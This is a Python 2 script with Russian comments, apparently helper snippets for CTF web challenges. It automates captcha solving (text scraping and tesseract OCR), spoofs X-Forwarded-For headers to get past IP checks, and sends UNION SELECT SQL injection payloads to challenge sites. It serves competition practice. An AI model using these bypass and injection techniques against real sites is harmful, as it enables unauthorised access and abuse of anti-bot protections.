# -*- coding: utf-8 -*-
from mechanize import Browser


### часть кода, выполняющая GET запрос с куками к ctftime.org
def sample_cookie():
    br.open("https://ctftime.org/") # fake'вый вызов открытия странички
    br.set_cookie("csrftoken=EB6XXXXXXXXXXXXXXXXXXXXXXXXXXpAC")
    br.set_cookie("sessionid=e56XXXXXXXXXXXXXXXXXXXXXXXXXXfc6") # пример куков для ctftime
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br.open("https://ctftime.org/")
    print >>open('test.txt','w+'), br.response().read() # вывод в файл полученного ответа

### Часть кода, выполяющая обход ТЕКСТОВОЙ капчи
def sample_textCap():
    br.open('http://ctf.nullcon.net/challenges/programming/challenge.php')
    text = br.response().read().split("\n") # получили ответ и разбили по строкам
    string=text[4].replace("<span>","").replace("</span>","").replace("&nbsp;", " ").replace("</p>","").strip() # вместо подготовки регулярного выражения dummy убираем лишние фиксированные символы с 5 строки
    br.select_form(nr=0) # находим первую форму на страничке
    br.method='POST' # настраиваем метод POST
    br['answer'] = string # подставляем в поле answer полученный результат
    print br.submit().read() # отправляем форму на сервер и печатаем полученный результат

### Добавление к запросу X-Forwarded-For
def sample_addHeader():
    br.addheaders = [('X-Forwarded-For', '127.0.0.1')]
    br.open("http://ctf.nullcon.net/challenges/web/web1/getflag.php")
    print br.response().read()

### Обход графической капчи
# На компьютере должен быть установлен tesseract (https://code.google.com/p/tesseract-ocr/)
import urllib, urllib2, os
from BeautifulSoup import BeautifulSoup, NavigableString

def sample_graphCap():
    br.set_handle_robots(False)
    br.open("http://misteryou.ru/ppc300/")
    text = br.response().read() # Открыть страницу с задачей
    soup = BeautifulSoup(text)
    urlimg = soup.find('img')['src'] # найти тег с изображением
    # Загрузить его в файл 123.png
    f = open("123.png", 'wb')
    f.write(urllib2.urlopen("http://misteryou.ru"+urlimg).read())
    f.close()
    os.system("tesseract.exe 123.png qqq"); # Распознать капчу в файл qqq.txt
    pz = open("qqq.txt", 'rb').read() # Прочитать данные в pz, затем можно их отправить обратно
    br.select_form(nr=0)
    br['answer'] = pz
    print br.submit().read()

### Добавление X-Forwarded-for средствами Mechanize + перекодирование страницы в CP1251
def antichat():
    br.addheaders = [('X-Forwarded-For', '10.10.10.10')]
    br.open("http://quest.rebz.net/sevenlev.php")
    print br.response().read().decode('cp1251')

### Выполнение POST-запроса с подготовленными с помощью URLLib параметрами
def POSTRequest():
    br.method='POST'
    data = urllib.urlencode({'id':'1 union select "herfrOmher",2--'})
    req = urllib2.Request('http://hackquest.phdays.com/missions/lietome1/index.php?id=1 union select 2,1 --',data)
    opener = urllib2.build_opener()
    print opener.open(req).read()

br = Browser()

